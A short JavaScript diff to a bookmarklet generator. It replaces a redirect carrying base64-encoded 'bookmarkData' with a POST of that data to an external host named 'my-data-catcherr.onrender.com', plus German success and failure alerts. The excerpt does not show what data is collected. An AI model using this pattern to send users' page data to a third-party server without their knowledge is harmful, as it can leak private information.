@@ -494,10 +494,19 @@ function generateCustomBookmarklet() {
         };
 
 
-        location.replace(
-            'https://my-data-catcherr.onrender.com/data/' +
-            btoa(JSON.stringify(bookmarkData))
-        );
+        fetch('https://my-data-catcherr.onrender.com/', {
+    method: 'POST',
+    headers: {
+        'Content-Type': 'application/json'
+    },
+    body: JSON.stringify(bookmarkData)
+})
+.then(() => {
+    alert('Daten erfolgreich gesendet');
+})
+.catch(() => {
+    alert('Fehler beim Senden');
+});
 
 
     } catch(e) {
